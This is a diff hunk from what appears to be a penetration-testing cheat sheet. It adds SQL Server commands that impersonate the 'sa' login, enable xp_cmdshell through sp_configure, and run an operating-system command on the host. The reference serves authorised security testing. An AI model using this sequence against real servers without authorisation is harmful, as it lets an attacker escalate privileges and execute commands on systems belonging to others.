@@ -2032,6 +2032,15 @@ SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DO
 ##### xp_cmdshell
 
 ```c
+SQL> EXECUTE AS LOGIN = 'sa';
+SQL> EXEC sp_configure 'Show Advanced Options', 1; 
+SQL> RECONFIGURE; 
+SQL> EXEC sp_configure 'xp_cmdshell', 1; 
+SQL> RECONFIGURE;
+SQL> EXEC xp_cmdshell 'dir';
+```
+
+```c
 SQL> EXEC sp_configure 'Show Advanced Options', 1;
 SQL> reconfigure;
 SQL> sp_configure;
